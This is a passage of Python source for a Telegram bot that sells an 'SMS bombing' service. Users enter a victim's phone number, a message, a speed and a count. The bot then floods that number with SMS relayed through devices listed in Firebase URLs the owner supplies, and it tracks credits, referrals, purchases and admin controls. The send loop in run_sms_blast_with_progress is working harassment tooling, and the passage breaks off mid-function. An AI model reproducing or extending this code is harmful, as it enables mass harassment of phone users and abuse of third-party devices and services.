        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", None, "📁"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", None, "🔒")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", None, "🔐"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", None, "📍")],
        [InlineKeyboardButton(text=mode_text, callback_data=mode_cb)],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", None, "🔄")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", None, "📤"), btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", None, "📹")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", None, "👥"), btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", None, "📊")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", None, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", None, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", None, "📢")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", None, "🔄")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", None, "📤")],
        [btn("ᴠɪᴅᴇᴏs", "user:random_video", None, "📹"), btn("ᴄʀᴇᴅɪᴛs", "user:credits", None, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", None, "🎁"), btn("ʀᴇғᴇʀ", "user:refer", None, "👥")],
        [btn("sᴛᴀᴛs", "user:stats", None, "📊"), btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", None, "📜")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", None, "💰")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", None, "💸")],
        [btn("ɪɴғᴏ", "user:info", None, "ℹ️")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", None, "➕")],
        [btn("ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", None, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        rows.append([btn(f"Video #{idx}", "noop", None, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]
    rows = [[
        btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", None, "➕"),
        btn("ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", None, "📄")
    ]]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16: label = label[:14] + ".."
        rows.append([
            btn(label, "noop", None, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", None, "🗑")
        ])
    nav_row = []
    if page > 0: nav_row.append(btn("ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", None, "◀️"))
    if page < total_pages - 1: nav_row.append(btn("ɴᴇxᴛ", f"owner:fb:menu:{page+1}", None, "▶️"))
    if nav_row: rows.append(nav_row)
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", None, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", None, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", None, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", None, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", None, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", None, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", None, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])
    lines = [f"👥 <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = "🚫"
        elif uid in approved: status = "✅"
        elif is_owner(uid, d): status = "👑"
        elif uid in d["admins"]: status = "🛡"
        else: status = "👤"
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | 💰{credits} | 📤{uses}")
    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", None, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ", f"{prefix}:users:pg:{page+1}", None, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", None, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"📊 <b>{sc('api stats')}</b>\n",
        f"📤 ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"❌ ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  😴 ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"🔥 {label}\n   ✅ {sent} sᴇɴᴛ  ❌ {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        log_text = (f"🆕 <b>NEW USER JOINED</b>\n\n👤 <b>Name:</b> {name}\n"
                    f"🆔 <b>User ID:</b> <code>{uid}</code>\n🌐 <b>Username:</b> {username}\n"
                    f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>")
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(referrer,
                        f"🎉 <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"💰 Aapko +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML")
                except: pass
        save(d)
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                         parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"🚀 Welcome!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer("🚫 Aapko ban kar diya gaya hai.", parse_mode="HTML"); return
    if not can_use(uid, d):
        await msg.answer("⛔ Access nahi hai! Owner se approval lein.", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)
    if is_new:
        log_text = (f"🆕 <b>NEW USER JOINED</b>\n\n👤 <b>Name:</b> {name}\n"
                    f"🆔 <b>User ID:</b> <code>{uid}</code>\n🌐 <b>Username:</b> {username}\n"
                    f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>")
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                         parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"🚀 Welcome!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer("🚫 Aapko ban kar diya gaya hai.", parse_mode="HTML"); return
    if not can_use(uid, d):
        await msg.answer("⛔ Access nahi hai! Owner se approval lein.", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                       parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"🚀 Welcome!")
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                   parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"📞 <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo:", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS:
        await msg.answer("🔒 Ye number protected hai!", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"✅ Number: <code>{mask_number(number)}</code>\n\n"
        f"💬 <b>{sc('step 2/4')} — {sc('message')}</b>\n\nJo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"✅ Message saved!\n\n⚡ <b>{sc('step 3/4')} — {sc('speed')}</b>\n\nSending speed select karein:",
        reply_markup=speed_kb("user"), parse_mode="HTML")

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(d)
    count = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        uc = get_user_credits(uid, d)
        credit_info = f"\n💰 Your Credits: <b>{uc}</b> (max {uc} bhej sakte hain)\n"
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n📊 <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"🔥 Online APIs : <b>{count}</b>\n📤 Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\nKitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer("❌ Sirf number bhejo (e.g. 5):", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d) and not is_owner(uid, d):
        cc = get_user_credits(uid, d)
        if cc <= 0:
            await msg.answer("❌ Aapke paas credits nahi hain!\n💰 Admin se contact karein.",
                             reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
        if count > cc:
            await msg.answer(f"⚠️ Aapke paas sirf {cc} credits hain! Ab {cc} bhej raha hoon...", parse_mode="HTML")
            count = cc
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(d)
    if not devices:
        await msg.answer("😴 Koi API online nahi! Refresh dabao.",
                         reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"👑 <b>Super Admin SMS Send</b>\n\n📞 <b>{sc('step 1/4')} — {sc('number')}</b>\n\nNumber bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo:", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(f"✅ Number: <code>{number}</code>\n\n💬 <b>{sc('step 2/4')}</b>\n\nMessage bhejo:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(f"✅ Saved!\n\n⚡ <b>{sc('step 3/4')}</b>\n\nSpeed select karein:",
                     reply_markup=speed_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    ss = speed_map.get(cq.data, SPEED_MEDIUM)
    sl = "🚀 FAST" if ss == SPEED_FAST else "⚡ MEDIUM" if ss == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=ss)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(load())
    count = len(devices)
    await cq.message.edit_text(
        f"{sl} <b>selected!</b>\n\n📊 <b>{sc('step 4/4')}</b>\n\n"
        f"🔥 APIs: <b>{count}</b>\n📤 Capacity: <b>{count * 3}</b>\n\nCount bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer("❌ Sirf number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    mt = fsmd.get("message", "")
    ss = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer("😴 Koi API online nahi!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, mt, count, devices, ss)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"🛡 <b>Admin SMS Send</b>\n\n📞 <b>{sc('step 1/4')}</b>\n\nNumber bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number:", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS:
        p = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != p:
            await msg.answer("🔒 Ye number protected hai!", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(f"✅ Number: <code>{mask_number(number)}</code>\n\n💬 <b>{sc('step 2/4')}</b>\n\nMessage bhejo:",
                     reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(f"✅ Saved!\n\n⚡ <b>{sc('step 3/4')}</b>\n\nSpeed:",
                     reply_markup=speed_kb("admin"), parse_mode="HTML")

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    ss = speed_map.get(cq.data, SPEED_MEDIUM)
    sl = "🚀 FAST" if ss == SPEED_FAST else "⚡ MEDIUM" if ss == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=ss)
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(load())
    count = len(devices)
    await cq.message.edit_text(
        f"{sl} <b>selected!</b>\n\n📊 <b>{sc('step 4/4')}</b>\n\n"
        f"🔥 APIs: <b>{count}</b>\n\nCount bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer("❌ Sirf number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    mt = fsmd.get("message", "")
    ss = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer("😴 Koi API online nahi!", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, mt, count, devices, ss)

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer("⚠️ Ek sending already chal rahi hai!", parse_mode="HTML"); return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(), parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS: del USER_SESSIONS[uid]
        return

    sent_ok = 0; sent_fail = 0; msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0: break
                async with session.lock:
                    if session.cancelled: break
                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0
                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled: break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
                        if ok:
                            sent_ok += 1; device_sent += 1; msgs_left -= 1
                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number, "message": message[:100],
                                    "timestamp": int(time.time()), "status": "sent"})
                                save(d_temp)
                        else:
                            sent_fail += 1; msgs_left -= 1
                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or session.cancelled):
                            ccl = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, ccl, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML")
                            except TelegramBadRequest: pass
                            last_update_time = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"Error in send loop: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS: del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number, "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"})
        save(d_final)
    else:
        d_final = load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        uci = await bot.get_chat(uid)
        u_name = uci.full_name or "Unknown"
        u_uname = f"@{uci.username}" if uci.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST LOG</b>\n\n👤 <b>User:</b> {u_name}\n"
        f"🆔 <code>{uid}</code>\n🌐 {u_uname}\n📞 <code>{number}</code>\n"
        f"💬 <code>{message}</code>\n✅ Sent: <b>{sent_ok}</b>\n❌ Failed: <b>{sent_fail}</b>\n"
        f"📊 Requested: <b>{count}</b>\n⏱ <b>{fmt_duration(duration)}</b>\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}")
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0: icon = "✅"
    elif sent_ok > 0: icon = "⚠️"
    else: icon = "❌"

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n💰 Used: <b>{sent_ok}</b>\n💳 Remaining: <b>{remaining}</b>"

    stopped_text = f"\n🛑 <b>User ne stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n⏱ Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", None, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", None, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", None, "📤"), btn("ʜᴏᴍᴇ", "user:home", None, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"📞 To: <code>{mask_number(number)}</code>\n"
            f"💬 Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b>\n❌ Failed: <b>{sent_fail}</b>\n"
            f"🔥 APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML")
